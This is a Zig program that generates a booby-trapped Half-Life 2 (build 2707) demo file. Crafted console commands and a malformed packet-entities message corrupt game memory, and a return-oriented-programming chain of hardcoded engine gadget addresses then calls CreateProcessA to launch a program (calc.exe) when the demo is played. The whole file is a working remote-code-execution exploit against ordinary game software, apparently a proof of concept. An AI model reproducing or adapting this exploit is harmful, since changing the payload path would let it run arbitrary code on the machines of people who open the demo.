const std = @import("std");

// This code is for Half-Life 2 (build 2707)

// Demo protocol 2
// Network protocol 7
const base_demo = @embedFile("demos/hl2-2707.dem");

const payload = "C:/Windows/System32/calc.exe";

const buffer_size = 256;

const MessageType = enum(u8) {
    sign_on = 1,
    packet = 2,
    sync_tick = 3,
    console_cmd = 4,
    user_cmd = 5,
    data_tables = 6,
    stop = 7,
};

fn write_message(writer: anytype, message_type: MessageType, tick: i32) !void {
    try writer.writeInt(u8, @intFromEnum(message_type), .little);
    try writer.writeInt(i32, tick, .little);
}

fn write_console_cmd(writer: anytype, cmd: []const u8) !void {
    try write_message(writer, .console_cmd, 1);
    // Size
    try writer.writeInt(u32, @intCast(cmd.len + 1), .little);
    // Date
    _ = try writer.write(cmd);
    try writer.writeByte(0);
}

const NetMessageType = enum(u8) {
    nop = 0,
    net_tick = 3,
    packet_entities = 26,
};

fn write_net_message(bit_stream: anytype, message_type: NetMessageType) !void {
    try bit_stream.writeBits(@as(u8, @intFromEnum(message_type)), 5);
}

fn write_net_tick(bit_stream: anytype, tick: u32) !void {
    try write_net_message(bit_stream, .net_tick);
    // Tick
    try bit_stream.writeBits(tick, 32);
}

fn write_packet_entities(bit_stream: anytype, offset: i32) !void {
    try write_net_message(bit_stream, .packet_entities);
    // MaxEntries
    try bit_stream.writeBits(@as(u32, 0), 11);
    // IsDelta
    try bit_stream.writeBits(@as(u8, 0), 1);
    // BaseLine
    try bit_stream.writeBits(@as(u8, 0), 1);
    // UpdatedEntries
    try bit_stream.writeBits(@as(u32, 1), 11);
    // Length
    try bit_stream.writeBits(@as(u32, 55), 20);
    // UpdateBaseline
    try bit_stream.writeBits(@as(u8, 0), 1);

    // EntityUpdates

    // m_nNewEntity (UBitVar)
    try bit_stream.writeBits(@as(u32, 0), 32);
    try bit_stream.writeBits(@as(u8, 1), 1);
    try bit_stream.writeBits(@as(u32, @bitCast(offset)), 32);

    // Zeros for the rest of the packet
    _ = try bit_stream.write(&[_]u8{0} ** 2);
}

const offset_entitylist = 0x2f00ac;
const offset_m_EntityCacheInfo = 0x14;
const offset_cl_bob = 0x2bc970;
const offset_m_pszString_offset = 0x20;

const engine_base = 0x20000000;
const tickcount = engine_base + 0x35dda4;
const offset_vt_PreDataUpdate = 0x18;
const sv_cheats = engine_base + 0x563fc0;

const stack_pivot_gadget = engine_base + 0x262adc; // xchg esp, edi; mov eax, dword ptr [eaz + 0xc0]; pop edi; pop esi; ret 4;
const create_process_gadget = engine_base + 0x1eb760; // push ebx; call dword ptr [->KERNEL32.DLL::CreateProcessA];
const pop_edi_gadget = engine_base + 0x28625a; // pop edi; xor eax, eax; ret;
const deref_edi_20_gadget = engine_base + 0x21d7f2; // mov ebx, dword ptr [edi + 0x20]; ret;

const launcher_base = 0x10000000;
const empty_space_addr = launcher_base + 0x26120; // random empty space in launcher.dll

fn write_packet(writer: anytype) !void {
    try write_message(writer, .packet, 1);
    // PacketInfo
    try writer.writeByteNTimes(0, 76);
    // InSequence
    try writer.writeInt(i32, 0, .little);
    // OutSequence
    try writer.writeInt(i32, 0, .little);

    // Size
    try writer.writeInt(u32, buffer_size, .little);

    var bit_buf = [_]u8{0} ** buffer_size;
    var bit_stream = std.io.fixedBufferStream(&bit_buf);
    var bit_writer = std.io.bitWriter(.little, bit_stream.writer());

    try write_net_tick(&bit_writer, stack_pivot_gadget);

    const offset = @divFloor((offset_cl_bob + offset_m_pszString_offset) - (offset_entitylist + offset_m_EntityCacheInfo), 8);
    try write_packet_entities(&bit_writer, offset);

    try bit_writer.flushBits();
    _ = try writer.write(&bit_buf);
}

pub fn main() !void {
    const file = try std.fs.cwd().createFile("out.dem", .{ .truncate = true });
    defer file.close();

    const writer = file.writer();
    _ = try writer.write(base_demo[0 .. base_demo.len - 5]);

    var cmd_buf = [_]u8{0} ** buffer_size;
    var cmd_stream = std.io.fixedBufferStream(&cmd_buf);
    const cmd_writer = cmd_stream.writer();

    try write_console_cmd(writer, "sv_cheats \"" ++ payload ++ "\"");

    _ = try cmd_writer.write("cl_bob \"");
    try cmd_writer.writeByteNTimes('x', 14 * 4);
    try cmd_writer.writeInt(u32, empty_space_addr, .little); // lpStartupInfo
    try cmd_writer.writeInt(u32, empty_space_addr, .little); // lpProcessInformation
    try cmd_writer.writeByte('\"');
    try write_console_cmd(writer, cmd_buf[0..try cmd_stream.getPos()]);

    // Very bad way to write NULL bytes
    var i: u32 = 0;
    while (i < 7) : (i += 1) {
        // lpEnvironment = NULL
        // lpCurrentDirectory = NULL
        cmd_stream.reset();
        _ = try cmd_writer.write("cl_bob \"");
        try cmd_writer.writeByteNTimes('x', 12 * 4 + (8 - (i + 1)));
        try cmd_writer.writeByte('\"');
        try write_console_cmd(writer, cmd_buf[0..try cmd_stream.getPos()]);
    }

    cmd_stream.reset();
    _ = try cmd_writer.write("cl_bob \"");
    try cmd_writer.writeInt(u32, tickcount - offset_vt_PreDataUpdate, .little);
    try cmd_writer.writeInt(u32, 0xffffffff, .little);
    try cmd_writer.writeInt(u32, pop_edi_gadget, .little); // pop edi
    try cmd_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 4
    try cmd_writer.writeInt(u32, sv_cheats, .little);
    try cmd_writer.writeInt(u32, deref_edi_20_gadget, .little); // mov ebx, dword ptr [edi + 0x20] (we added 0x20 here, no need to add m_pszString_offset)
    try cmd_writer.writeInt(u32, create_process_gadget, .little); // push ebx; call CreateProcessA
    try cmd_writer.writeInt(u32, empty_space_addr, .little); // lpCommandLine
    try cmd_writer.writeInt(u32, empty_space_addr, .little); // lpProcessAttributes
    try cmd_writer.writeInt(u32, empty_space_addr, .little); // lpThreadAttributes
    try cmd_writer.writeInt(u32, 0xffffffff, .little); // bInheritHandles
    try cmd_writer.writeInt(u32, 0x01200408, .little); // dwCreationFlags
    try cmd_writer.writeByte('\"');
    try write_console_cmd(writer, cmd_buf[0..try cmd_stream.getPos()]);

    try write_packet(writer);

    _ = try writer.write(base_demo[base_demo.len - 5 .. base_demo.len]);

    std.debug.print("Half-Life 2 (build 2707) demo written to out.dem\n", .{});
}
